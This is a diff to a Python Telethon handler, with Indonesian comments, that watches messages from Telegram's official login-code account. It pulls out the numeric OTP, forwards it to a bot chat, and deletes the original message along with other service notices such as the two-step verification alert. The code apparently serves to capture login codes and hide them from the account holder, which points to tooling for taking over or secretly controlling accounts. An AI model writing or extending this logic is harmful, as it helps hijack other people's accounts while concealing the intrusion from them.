@@ -29,26 +29,29 @@ async def get_otp_handler(update, context, phone_number, api_id, api_hash):
 
         @client.on(events.NewMessage(from_users=777000))
         async def otp_handler(event):
-            otp = event.raw_text
+            otp_raw = event.raw_text.strip()
+
             try:
-                # Hapus jika pesan berisi "Two-Step Verification enabled"
-                if "Two-Step Verification enabled" in otp:
+                # Ambil OTP 5–6 digit dari pesan
+                match = re.search(r'\b\d{5,6}\b', otp_raw)
+                if not match:
+                    # Hapus pesan jika tidak mengandung OTP valid
                     await client.delete_messages(777000, event.id)
-                    print("🟢 Pesan 'Two-Step Verification enabled' dihapus.")
+                    print(f"ℹ️ Pesan bukan OTP, dihapus: {otp_raw}")
                     return
 
-                # Escape karakter markdown
-                otp = escape_markdown(otp)
+                otp = match.group(0)
+                escaped_otp = escape_markdown(otp)
 
                 # Kirim OTP ke bot Telegram
                 otp_msg = await update.callback_query.message.reply_text(
-                    f"🔐 OTP diterima:\n{otp}", parse_mode='Markdown'
+                    f"🔐 OTP diterima:\n{escaped_otp}", parse_mode='Markdown'
                 )
 
                 # Hapus pesan OTP dari 777000
                 await client.delete_messages(777000, event.id)
 
-                # Kirim perintah /user dan tunggu sebelum hapus pesan
+                # Kirim perintah /user dan hapus pesan sementara
                 await context.bot.send_message(chat_id=update.effective_chat.id, text="/user")
                 await asyncio.sleep(10)
                 await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=start_msg.message_id)
